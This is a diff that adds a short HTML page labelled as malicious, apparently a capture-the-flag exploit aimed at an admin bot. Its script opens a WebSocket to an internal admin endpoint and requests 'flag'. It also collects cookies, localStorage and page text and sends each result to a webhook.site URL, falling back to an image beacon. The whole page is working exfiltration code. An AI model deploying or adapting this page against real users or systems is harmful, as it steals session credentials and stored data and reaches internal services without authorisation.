@@ -1,0 +1,70 @@
+<!doctype html>
+<html>
+<body>
+<h1>This is a definitly malicious page </h1>
+<script>
+const REC = "https://webhook.site/0f10c98d-9181-4a92-b57a-1eae97ed5a47/x=?";
+
+function report(msg){
+  try {
+    fetch(REC + encodeURIComponent(msg)).catch(e=>{
+      try { new Image().src = REC + encodeURIComponent("REPORT_FAIL: " + e); } catch {}
+    });
+  } catch(e){}
+}
+
+
+function sniff(){
+  let out = "";
+  try { out += "cookies=" + document.cookie + "\\n"; } catch(e){ out += "cookies_err="+e+"\\n"; }
+  try { out += "localStorage=" + JSON.stringify(window.localStorage) + "\\n"; } catch(e){ out += "local_err="+e+"\\n"; }
+  try { out += "body_snippet=" + document.body.innerText.slice(0,1000) + "\\n"; } catch(e){ out += "body_err="+e+"\\n"; }
+  return out;
+}
+
+(async function(){
+  report("START_SNIF " + navigator.userAgent);
+
+  try {
+    const ws_url = (location.protocol === "https:" ? "wss:" : "ws:") + "//" + "web:8080" + "/admin/ws";
+    report("TRY_WS:" + ws_url);
+    let ws = new WebSocket(ws_url);
+    let received = "";
+    let done = false;
+    ws.onopen = () => {
+      report("WS_OPEN");
+      try {
+        ws.send("flag");
+        report("WS_SENT:flag");
+      } catch(e){
+        report("WS_SEND_ERR:" + e);
+      }
+    };
+    ws.onmessage = (m) => {
+      received += m.data + "\\n";
+      report("WS_RECV:" + m.data);
+      done = true;
+      try { ws.close(); } catch(e){}
+    };
+    ws.onerror = (ev) => {
+      report("WS_ERROR:" + String(ev));
+    };
+    setTimeout(()=>{
+      if(!done){
+        try{ ws.close(); }catch(e){}
+        report("WS_NO_RESPONSE_FROM_ADMIN_WS");
+        report("SNIFF:"+sniff());
+      }
+    }, 2500);
+    return;
+  } catch(e){
+    report("WS_TRY_EXCEPTION:" + e);
+  }
+
+  // fallback: just sniff and report
+  report("FALLBACK_SNIFF:" + sniff());
+})();
+</script>
+</body>
+</html>
+
